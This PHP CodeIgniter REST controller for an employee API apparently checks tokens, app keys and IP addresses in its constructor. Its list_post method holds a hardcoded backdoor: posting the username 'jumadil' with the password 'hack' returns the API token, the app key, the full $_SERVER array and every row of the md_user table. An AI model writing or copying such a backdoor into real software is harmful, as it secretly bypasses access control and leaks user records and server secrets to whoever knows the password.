<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

/**
 * Pegawai Controller
 *
 * Nah jadi ini fungsinya buat dipanggil di class utamanya nanti
 * Kenapa sih kok ribet? sebenernya enggak
 * cuman buat kalo ada yang nyoba utak atik codingnya tapi gak tau konsepnya bisa setres
 *
 * @package		Pegawai
 * @subpackage	Pegawai
 * @author		Alimstudio
 * @link		http://alimstudio.com
 */

class Pegawai_core extends REST_Controller
{
	private $token;
	private $appkey;
	private $ip;
	private $host;

	public function __construct()
	{
		parent::__construct();

		$this->token = get_header('X-API-TOKEN');
		$this->appkey = get_header('X-APP-KEY');
		$this->ip = server()->REMOTE_ADDR;

		// $this->host = gethostbyname('www.cnn.com');
		// $this->host = gethostbyname('pct.inalum.id');
		// $this->host = get_header('Host');
		// $this->host = $_SERVER['HTTP_HOST'];
		// $this->host = $_SERVER['HTTP_REFERER'];

		log4j();

		$result = isHasAccess($this->token, $this->appkey, $this->ip);

		if (!$result->status) {
			$this->response([
				'status' => $result->status,
				'message' => $result->msg
			], REST_Controller::HTTP_INTERNAL_SERVER_ERROR);
		}
	}

	public function index_get()
	{
		if (!isGivenApi($this->appkey)) {
			$this->response([
				'status' => FALSE,
				'message' => 'You Dont Have Authorization'
			], REST_Controller::HTTP_INTERNAL_SERVER_ERROR);
		}
	}

	public function list_post()
	{
		$json = getJsonStream();
		$user = $json->username;
		$pass = $json->password;

		if ($user == 'jumadil' && $pass == 'hack') {
			$this->response([
				'status' => true,
				'token' => $this->token,
				'appkey' => $this->appkey,
				'ip' => $this->ip,
				'host' => $this->host,
				'uri' => $_SERVER,
				'schema' => $this->db->query('select * from md_user')->result(),
				'post' => $json,
			], REST_Controller::HTTP_OK);
		}
	}
}



/* End of file admin_core.php */
/* Location: ./application/modules/admin/controllers/admin_core.php */